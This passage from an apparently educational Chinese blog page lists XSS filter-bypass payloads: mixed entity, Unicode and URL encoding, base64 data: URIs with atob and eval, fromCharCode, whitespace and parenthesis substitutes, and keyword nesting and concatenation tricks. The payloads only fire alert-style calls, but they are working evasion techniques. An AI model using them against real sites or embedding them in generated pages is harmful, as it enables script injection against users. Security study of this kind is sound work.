class="hljs-symbol">&amp;#x3a;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6c;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x29;</span>&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Unicode 编码</strong></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span><span class="hljs-string">&quot;javascript:<span class="hljs-char escape_">\u</span>0061<span class="hljs-char escape_">\u</span>006c<span class="hljs-char escape_">\u</span>0065<span class="hljs-char escape_">\u</span>0072<span class="hljs-char escape_">\u</span>0074(1)&quot;</span><span class="hljs-operator">&gt;</span>test<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure><p><strong>注：Unicode 编码不能对括号使用</strong></p><p><strong>url 编码</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;a href=<span class="hljs-string">&quot;javascript:<span class="hljs-variable">%6</span>1%6c<span class="hljs-variable">%6</span>5<span class="hljs-variable">%7</span>2<span class="hljs-variable">%7</span>4<span class="hljs-variable">%2</span>8<span class="hljs-variable">%3</span>1<span class="hljs-variable">%29</span>&quot;</span>&gt;test&lt;/a&gt;<br></code></pre></td></tr></table></figure><p><strong>由于浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，所以可以编码方式进行组合绕过。</strong></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-number">1</span>. 原代码<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="hljs-number">2</span>. 对alert进行JS编码（unicode编码）<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="hljs-number">3</span>. 对href标签中的\u0061\u006c\u0065\u0072\u0074进行URL编码<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="hljs-number">4</span>. 对href标签中的javascript:<span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%36</span><span class="hljs-meta">%31</span><span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%36</span><span class="hljs-meta">%63</span><span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%36</span><span class="hljs-meta">%35</span><span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%37</span><span class="hljs-meta">%32</span><span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%37</span><span class="hljs-meta">%34</span>(<span class="hljs-number">1</span>)进行HTML编码：<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x6a;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x76;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x73;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x69;</span><span class="hljs-symbol">&amp;#x70;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x3a;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x36;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x36;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x36;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x36;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x32;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x34;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x29;</span>&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>注：href、src等加载url的属性可以使用三种混合编码，on事件可以使用html实体编码和js编码混合，但url编码在on事件中不会解析。</strong></p><h3 id="0x05-base64-编码"><a href="#0x05-base64-编码" class="headerlink" title="0x05. base64 编码"></a>0x05. base64 编码</h3><p><strong>base64 编码通常需要使用到 data 伪协议。</strong></p><p><strong>data 协议使用方法：<code>data:资源类型;编码,内容</code></strong></p><p>base64编码内容为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=<br></code></pre></td></tr></table></figure><blockquote><p>通常与 base64 编码配合 data 协议的标签有 <strong><object>、<a>、<iframe></strong></p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">1.<span class="hljs-tag">&lt;<span class="hljs-name">object</span>&gt;</span> 标签<br><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br>2.<span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span> 标签<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>   （新版浏览器不支持）<br>3.<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span> 标签<br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>4.<span class="hljs-tag">&lt;<span class="hljs-name">embed</span>&gt;</span> 标签<br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">embed</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>atob 函数</strong></p><p>atob() 方法用于解码使用 base-64 编码的字符串。</p><blockquote><p>语法：<code>window.atob(encodedStr)</code>(encodedStr: 必需，是一个通过 btoa() 方法编码的字符串)</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>.&lt;<span class="hljs-selector-tag">a</span> href=javascript:<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">atob</span>(<span class="hljs-string">&#x27;YWxlcnQoMSk=&#x27;</span>))&gt;test&lt;/a&gt;<br><span class="hljs-number">2</span>.&lt;<span class="hljs-selector-tag">a</span> href=javascript:<span class="hljs-built_in">eval</span>(window<span class="hljs-selector-class">.atob</span>(<span class="hljs-string">&#x27;YWxlcnQoMSk=&#x27;</span>))&gt;test&lt;/a&gt;<br><span class="hljs-number">3</span>.&lt;<span class="hljs-selector-tag">a</span> href=javascript:<span class="hljs-built_in">eval</span>(window<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;atob&#x27;</span>]</span>(<span class="hljs-string">&#x27;YWxlcnQoMSk=&#x27;</span>))&gt;test&lt;/a&gt;<br><span class="hljs-number">4</span>.&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=x onmouseover=<span class="hljs-string">&quot;eval(window.atob(&#x27;YWxlcnQoMSk=&#x27;))&quot;</span>&gt;<br><span class="hljs-number">5</span>.&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=x onerror=<span class="hljs-string">&quot;eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&quot;</span>&gt;<br><span class="hljs-number">6</span>.&lt;<span class="hljs-selector-tag">iframe</span> <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:eval(window[&#x27;atob&#x27;](&#x27;YWxlcnQoMSk=&#x27;))&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><h3 id="0x06-ascii-编码"><a href="#0x06-ascii-编码" class="headerlink" title="0x06. ascii 编码"></a>0x06. ascii 编码</h3><blockquote><p>ascii 编码一般配合<code>String.fromCharCode</code>使用。</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">alert</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br>十进制：<span class="hljs-number">97</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">116</span>, <span class="hljs-number">40</span>, <span class="hljs-number">49</span>, <span class="hljs-number">41</span><br>十六进制：<span class="hljs-number">0</span>x61, <span class="hljs-number">0</span>x6C, <span class="hljs-number">0</span>x65, <span class="hljs-number">0</span>x72, <span class="hljs-number">0</span>x74, <span class="hljs-number">0</span>x28, <span class="hljs-number">0</span>x31, <span class="hljs-number">0</span>x29<br></code></pre></td></tr></table></figure><p><strong>十进制</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&#x27;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>十六进制</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;javascript:eval(String.fromCharCode(0x61, 0x6C, 0x65, 0x72, 0x74, 0x28, 0x31, 0x29))&#x27;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><blockquote><html><img**AA**src**AA**onerror**BB**=**BB**alert**CC**(1)**DD**</html></blockquote><p>A位置可填充 /，/123/，%09，%0A，%0C，%0D，%20 B位置可填充 %09，%0A，%0C，%0D，%20 C位置可填充 %0B，/**/，如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20 D位置可填充 %09，%0A，%0C，%0D，%20，//，&gt;</p><h2 id="圆括号过滤绕过"><a href="#圆括号过滤绕过" class="headerlink" title="圆括号过滤绕过"></a>圆括号过滤绕过</h2><h3 id="0x01-反引号替换"><a href="#0x01-反引号替换" class="headerlink" title="0x01. 反引号替换"></a>0x01. 反引号替换</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x02-throw-绕过"><a href="#0x02-throw-绕过" class="headerlink" title="0x02. throw 绕过"></a>0x02. throw 绕过</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;video src <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;<br>&lt;svg/<span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="单引号过滤绕过"><a href="#单引号过滤绕过" class="headerlink" title="单引号过滤绕过"></a>单引号过滤绕过</h2><h3 id="0x01-斜杠替换"><a href="#0x01-斜杠替换" class="headerlink" title="0x01. 斜杠替换"></a>0x01. 斜杠替换</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x02-反引号替换"><a href="#0x02-反引号替换" class="headerlink" title="0x02. 反引号替换"></a>0x02. 反引号替换</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">`xss`</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="alert-过滤绕过"><a href="#alert-过滤绕过" class="headerlink" title="alert 过滤绕过"></a>alert 过滤绕过</h2><h3 id="0x01-prompt-替换"><a href="#0x01-prompt-替换" class="headerlink" title="0x01. prompt 替换"></a>0x01. prompt 替换</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">prompt</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x02-confirm-替换"><a href="#0x02-confirm-替换" class="headerlink" title="0x02. confirm 替换"></a>0x02. confirm 替换</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x03-console-log-替换"><a href="#0x03-console-log-替换" class="headerlink" title="0x03. console.log 替换"></a>0x03. console.log 替换</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">3</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x04-document-write-替换"><a href="#0x04-document-write-替换" class="headerlink" title="0x04. document.write 替换"></a>0x04. document.write 替换</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x05-base64-绕过"><a href="#0x05-base64-绕过" class="headerlink" title="0x05. base64 绕过"></a>0x05. base64 绕过</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Function`a<span class="hljs-variable">$&#123;atob`YWxlcnQoMSk=`&#125;</span>```&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;``.constructor.constructor`a<span class="hljs-variable">$&#123;atob`YWxlcnQoMSk=`&#125;</span>```&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="关键词置空绕过"><a href="#关键词置空绕过" class="headerlink" title="关键词置空绕过"></a>关键词置空绕过</h2><h3 id="0x01-大小写绕过"><a href="#0x01-大小写绕过" class="headerlink" title="0x01. 大小写绕过"></a>0x01. 大小写绕过</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以转换为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ScRiPt</span>&gt;</span><span class="language-javascript"><span class="hljs-title class_">AlErT</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">sCrIpT</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x02-嵌套绕过"><a href="#0x02-嵌套绕过" class="headerlink" title="0x02. 嵌套绕过"></a>0x02. 嵌套绕过</h3><blockquote><p>嵌套<script>和</script>突破</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以转换为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;sc<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">ript&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)&lt;/sc</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>ript&gt;<br></code></pre></td></tr></table></figure><h2 id="函数拼接"><a href="#函数拼接" class="headerlink" title="函数拼接"></a>函数拼接</h2><h3 id="0x01-eval"><a href="#0x01-eval" class="headerlink" title="0x01. eval"></a>0x01. eval</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="0x02-top"><a href="#0x02-top" class="headerlink" title="0x02. top"></a>0x02. top</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="0x03-window"><a href="#0x03-window" class="headerlink" title="0x03. window"></a>0x03. window</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="0x04-self"><a href="#0x04-self" class="headerlink" title="0x04. self"></a>0x04. self</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;self[`al`+`ert`](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="0x05-parent"><a href="#0x05-parent" class="headerlink" title="0x05. parent"></a>0x05. parent</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;parent[`al`+`ert`](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="0x06-frames"><a href="#0x06-frames" class="headerlink" title="0x06. frames"></a>0x06. frames</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;frames[`al`+`ert`](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="0x07-常用函数"><a href="#0x07-常用函数" class="headerlink" title="0x07. 常用函数"></a>0x07. 常用函数</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;eval(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;open(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;document.write(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;setTimeout(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;setInterval(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Set.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Map.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Array.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;WeakSet.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> 